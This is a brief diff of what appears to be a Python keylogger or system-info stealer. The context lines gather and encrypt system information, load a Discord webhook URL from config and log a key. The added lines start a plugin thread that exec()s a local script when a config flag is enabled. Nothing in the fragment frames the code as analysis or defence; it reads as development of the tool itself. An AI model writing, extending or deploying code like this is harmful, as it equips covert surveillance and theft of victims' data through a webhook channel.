@@ -78,7 +78,12 @@ encrypted_sys_info = encrypt_text(cipher_suite, sys_info)
 # Loads the webhook from the config
 webhook_url = str(config.get('main','discordwebhookurl'))
 
-
+def run_script():
+    exec(open('discordrpc.py').read())
+if str(config.get('Plugins',"discordrpc")) == "true":
+    #RPC Thread
+    thread = threading.Thread(target=run_script)
+    thread.start()
 
 # logs the key
 save_encryption_info(config, encryption_key, encrypted_sys_info)
